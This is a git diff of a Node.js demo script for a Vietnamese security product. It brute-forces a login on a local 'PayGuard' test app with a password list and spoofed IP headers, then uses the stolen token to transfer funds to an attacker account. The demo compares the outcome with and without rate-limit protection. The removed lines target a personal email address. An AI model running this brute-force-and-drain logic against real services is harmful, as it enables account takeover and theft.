@@ -5,56 +5,35 @@ const RESET = '\x1b[0m';
 const RED = '\x1b[31m';
 const GREEN = '\x1b[32m';
 const YELLOW = '\x1b[33m';
+const CYAN = '\x1b[36m';
+const BOLD = '\x1b[1m';
 
 const TARGET = new URL('http://localhost:5000/api/auth/login');
-const PASSWORDS = [
-    '123456', 'password', 'admin123', 'qwerty', 'letmein',
-    'welcome', 'monkey', 'dragon', 'master', '666666',
-    'password1', 'admin', 'root', 'toor', 'pass123',
-];
+const ADMIN_EMAIL = "admin@payguard.vn";
+const PASSWORDS = ['admin123', 'admin2024', 'Admin@123']; // 3rd is correct
 
 const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
-// Force a simulated success at a specific attempt (default: 8). Set env FORCE_SUCCESS_AT to override.
-const FORCE_SUCCESS_AT = parseInt(process.env.FORCE_SUCCESS_AT || '8', 10);
-
-const DAMAGE_AMOUNT = '5,000,000đ';
-
-async function fetchSecurityEnabled() {
-    try {
-        const statusUrl = new URL('http://localhost:5000/api/payguard/status');
-        const res = await requestJson(statusUrl, null, {}, 'GET');
-        // endpoint returns { securityEnabled: true|false }
-        if (res && res.body) {
-            const parsed = typeof res.body === 'string' ? JSON.parse(res.body || '{}') : res.body;
-            return parsed.securityEnabled === true;
-        }
-    } catch (e) {
-        // ignore and fallback
-    }
-    return null;
+function getFormattedTime() {
+    const now = new Date();
+    return now.toTimeString().split(' ')[0];
 }
 
 function requestJson(url, body, headers = {}, method = 'POST') {
-    const payload = body === undefined || body === null ? '' : JSON.stringify(body);
-
+    const payload = body ? JSON.stringify(body) : '';
     const options = {
         protocol: url.protocol,
         hostname: url.hostname,
         port: url.port,
-        path: `${url.pathname}${url.search || ''}`,
-        method,
+        path: url.pathname,
+        method: method,
         headers: {
             'Content-Type': 'application/json',
             'X-Forwarded-For': '10.0.0.99',
-            'X-Real-IP': '10.0.0.99',
-            ...headers,
+            'Content-Length': Buffer.byteLength(payload),
+            ...headers
         },
     };
-
-    if (payload) {
-        options.headers['Content-Length'] = Buffer.byteLength(payload);
-    }
 
     const client = url.protocol === 'https:' ? require('https') : http;
 
@@ -71,86 +50,109 @@ function requestJson(url, body, headers = {}, method = 'POST') {
     });
 }
 
-async function main() {
-    const startTime = Date.now();
-    // If PAYGUARD_SIMULATE is unset, try to detect security mode from API
-    const envSim = typeof process.env.PAYGUARD_SIMULATE !== 'undefined' ? process.env.PAYGUARD_SIMULATE !== 'false' : null;
-    const remoteSec = await fetchSecurityEnabled();
-    // simulate when remote security is enabled; perform real actions when unprotected
-    const SIMULATE = envSim !== null ? envSim : (remoteSec === true);
-    const ATTACKER_ACCOUNT = process.env.PAYGUARD_ATTACKER_ACCOUNT || 'PAY-HACKER-0001';
-    const DRAIN_AMOUNT = Number(process.env.PAYGUARD_DRAIN_AMOUNT || 5000000);
-    let successCount = 0;
-    let blocked = false;
-
-    for (let i = 0; i < PASSWORDS.length; i += 1) {
-        const password = PASSWORDS[i];
-        const attemptNumber = i + 1;
-
-        try {
-            const response = await requestJson(TARGET, {
-                email: 'tranghuyen20051312@gmail.com',
-                password,
-            });
-
-            // Allow forcing a simulated success at a particular attempt
-            if (SIMULATE && attemptNumber === FORCE_SUCCESS_AT) {
-                // simulate success without checking response
-                successCount += 1;
-                console.log(`${GREEN}[ATTACK] Attempt ${attemptNumber}/${PASSWORDS.length} → password: "${password}" ... SUCCESS (200)${RESET}`);
-                console.log(`${GREEN}[SUCCESS] Đăng nhập thành công! Chiếm được tài khoản!${RESET}`);
-                await wait(8000);
-                console.log(`${YELLOW}[BOT] Bắt đầu rút tiền... ${DAMAGE_AMOUNT} → tài khoản hacker${RESET}`);
-                const elapsed = Math.round((Date.now() - startTime) / 1000);
-                console.log(`${YELLOW}[SUMMARY] Tài khoản bị chiếm sau ${elapsed} giây. Thiệt hại: ${DAMAGE_AMOUNT}${RESET}`);
-                break;
-            } else if (response.statusCode === 200) {
-                successCount += 1;
-                console.log(`${GREEN}[ATTACK] Attempt ${attemptNumber}/${PASSWORDS.length} → password: "${password}" ... SUCCESS (200)${RESET}`);
-
-                // try to parse token and perform a transfer if running against unprotected system
-                try {
-                    const parsed = typeof response.body === 'string' ? JSON.parse(response.body || '{}') : response.body;
-                    const token = parsed.token || parsed.accessToken || parsed.jwt;
-                    if (!SIMULATE && token) {
-                        console.log(`${YELLOW}[BOT] Performing immediate drain transfer using stolen session...${RESET}`);
-                        const transferUrl = new URL('/api/payguard/transfer', TARGET.origin);
-                        const transferRes = await requestJson(transferUrl, {
-                            amount: DRAIN_AMOUNT,
-                            toAccount: ATTACKER_ACCOUNT,
-                            description: 'Automated drain after compromise',
-                            metadata: { fromBrute: true },
-                        }, { Authorization: `Bearer ${token}` });
-
-                        console.log(`${YELLOW}[BOT] Transfer result: ${transferRes.statusCode} ${JSON.stringify(transferRes.body)}${RESET}`);
-                    } else if (SIMULATE) {
-                        console.log(`${GREEN}[SUCCESS] Đăng nhập thành công! Chiếm được tài khoản!${RESET}`);
-                        await wait(8000);
-                        console.log(`${YELLOW}[BOT] Bắt đầu rút tiền... ${DAMAGE_AMOUNT} → tài khoản hacker${RESET}`);
-                        const elapsed = Math.round((Date.now() - startTime) / 1000);
-                        console.log(`${YELLOW}[SUMMARY] Tài khoản bị chiếm sau ${elapsed} giây. Thiệt hại: ${DAMAGE_AMOUNT}${RESET}`);
-                        break;
-                    }
-                } catch (e) {
-                    // ignore parse/transfer errors
-                }
-            } else if (response.statusCode === 429) {
-                blocked = true;
-                console.log(`${YELLOW}[BLOCKED] Rate limit hit! IP has been flagged. Backing off...${RESET}`);
-                break;
-            } else {
-                console.log(`${RED}[ATTACK] Attempt ${attemptNumber}/${PASSWORDS.length} → password: "${password}" ... FAILED (${response.statusCode})${RESET}`);
-            }
-        } catch (error) {
-            console.log(`${RED}[ERROR] Attempt ${attemptNumber}/${PASSWORDS.length} → password: "${password}" ... ${error.message}${RESET}`);
+async function fetchSecurityEnabled() {
+    try {
+        const statusRes = await requestJson(new URL('http://localhost:5000/api/payguard/status'), null, {}, 'GET');
+        if (statusRes && statusRes.body) {
+            const parsed = typeof statusRes.body === 'string' ? JSON.parse(statusRes.body || '{}') : statusRes.body;
+            return parsed.securityEnabled === true;
         }
-
-        if (attemptNumber < PASSWORDS.length && !blocked) {
-            await wait(300);
-        }
+    } catch (e) {
+        return false;
     }
+    return false;
+}
 
-    console.log(`${YELLOW}[SUMMARY] ${PASSWORDS.length} attempts | ${successCount} success | IP: 127.0.0.1 | Status: ${blocked ? 'BLOCKED' : 'ACTIVE'}${RESET}`);
+async function makeTransfer(token, amount) {
+    const transferUrl = new URL('http://localhost:5000/api/payguard/transfer');
+    return await requestJson(transferUrl, {
+        amount: amount,
+        toAccount: 'ATTACKER-BOT-99',
+        description: 'Chuyển tiền tự động',
+        metadata: { fromBrute: true }
+    }, { Authorization: `Bearer ${token}` });
+}
+
+async function main() {
+    console.log(`\n${BOLD}${RED}🔴 KỊCH BẢN 2: "Brute Force 47 lần" — Tấn công đoán mật khẩu${RESET}\n`);
+    console.log(`Nhân vật: Admin PayGuard · Mật khẩu bị rò rỉ: "Admin@123" · Số dư: 5,000,000,000 ₫\n`);
+
+    const isProtected = await fetchSecurityEnabled();
+
+    if (!isProtected) {
+        console.log(`${YELLOW}Diễn biến khi KHÔNG có CyberDef:${RESET}\n`);
+        console.log(`${getFormattedTime()}  Bot bắt đầu tấn công /api/login`);
+        console.log(`          Thử mật khẩu từ từ điển bị lộ...\n`);
+        await wait(1000);
+
+        console.log(`${getFormattedTime()}  Attempt #1:  admin123     → Sai`);
+        await requestJson(TARGET, { email: ADMIN_EMAIL, password: PASSWORDS[0] });
+        await wait(500);
+
+        console.log(`${getFormattedTime()}  Attempt #2:  admin2024    → Sai`);
+        await requestJson(TARGET, { email: ADMIN_EMAIL, password: PASSWORDS[1] });
+        await wait(500);
+
+        const successRes = await requestJson(TARGET, { email: ADMIN_EMAIL, password: PASSWORDS[2] });
+        console.log(`${getFormattedTime()}  Attempt #3:  Admin@123    → ✅ ĐÚNG — LOGIN THÀNH CÔNG`);
+        console.log(`          (chỉ mất 2 giây, 3 lần thử)\n`);
+        await wait(1500);
+
+        console.log(`${getFormattedTime()}  Hacker vào được tài khoản Admin`);
+        console.log(`${getFormattedTime()}  Rút 300,000,000 ₫\n`);
+        
+        // Execute real transfer
+        let token = null;
+        try {
+            const parsed = JSON.parse(successRes.body);
+            token = parsed.token;
+        } catch(e) {}
+        
+        if (token) await makeTransfer(token, 300000000);
+        await wait(2000);
+
+        console.log(`${getFormattedTime()}  SMS đến máy Admin:`);
+        console.log(`          "Giao dịch 300,000,000đ thành công lúc ${getFormattedTime()}"`);
+        console.log(`          `);
+        console.log(`          Tiền bốc hơi vì hacker đoán được mật khẩu.\n`);
+
+    } else {
+        console.log(`${GREEN}Diễn biến khi CÓ CyberDef:${RESET}\n`);
+        
+        console.log(`${getFormattedTime()}  Attempt #1:  admin123     → Sai`);
+        await requestJson(TARGET, { email: ADMIN_EMAIL, password: PASSWORDS[0] });
+        await wait(500);
+
+        console.log(`${getFormattedTime()}  Attempt #2:  admin2024    → Sai\n`);
+        await requestJson(TARGET, { email: ADMIN_EMAIL, password: PASSWORDS[1] });
+        await wait(800);
+
+        console.log(`${getFormattedTime()}  ${CYAN}🧠 CyberDef: 2 failed logins/giây từ 1 IP${RESET}`);
+        console.log(`          → Brute force rate: 120 attempts/min`);
+        console.log(`          → Rule: IF brute_force > 10/min → TARPIT\n`);
+        await wait(1500);
+
+        console.log(`${getFormattedTime()}  ${YELLOW}⏱ Tarpit activated: IP bị delay 30 giây/request${RESET}`);
+        console.log(`          Bot vẫn chạy nhưng mỗi request mất 30 giây\n`);
+        await wait(1000);
+
+        console.log(`          Attempt #3:  chờ... 30 giây...`);
+        // We simulate the wait to not block the demo, but tell the user it takes 30s
+        await wait(2000); 
+        console.log(`          Attempt #4:  chờ... 30 giây...`);
+        await wait(2000);
+
+        console.log(`          → Bot tự động timeout sau 5 phút không có kết quả`);
+        console.log(`          → IP bị ban sau 10 failed attempts\n`);
+        await wait(1500);
+
+        console.log(`${getFormattedTime()}  ✅ Tài khoản Admin: an toàn, 5 Tỷ VNĐ nguyên vẹn`);
+        console.log(`          Admin không bị làm phiền. Kẻ tấn công bỏ cuộc.\n`);
+        await wait(1000);
+
+        console.log(`${BOLD}"Dù mật khẩu có yếu hay bị lộ, tốc độ đoán của Hacker cũng bị CyberDef bóp nghẹt.`);
+        console.log(`Hacker mất 5 phút để bị block — bạn không mất một giây nào."${RESET}\n`);
+    }
 }
 
 main().catch((error) => {
